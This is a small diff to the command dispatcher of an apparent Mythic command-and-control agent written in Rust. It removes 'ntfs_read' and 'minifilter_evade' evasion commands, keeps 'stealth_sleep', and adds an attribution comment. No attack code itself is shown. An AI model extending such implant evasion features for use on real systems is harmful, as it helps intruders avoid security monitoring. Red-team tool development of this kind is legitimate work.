@@ -211,10 +211,8 @@ impl Tasker {
                             "c2info" => c2manage::c2info(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "killdate" => c2manage::killdate(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
 
-                            // Stealth evasion commands
+                            // Stealth evasion commands (@Kudaes/Shelter)
                             "stealth_sleep" => stealth::stealth_sleep(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
-                            "ntfs_read" => stealth::ntfs_read(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
-                            "minifilter_evade" => stealth::minifilter_evade(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
 
                             _ => mythic_error!(
                                 task.id,
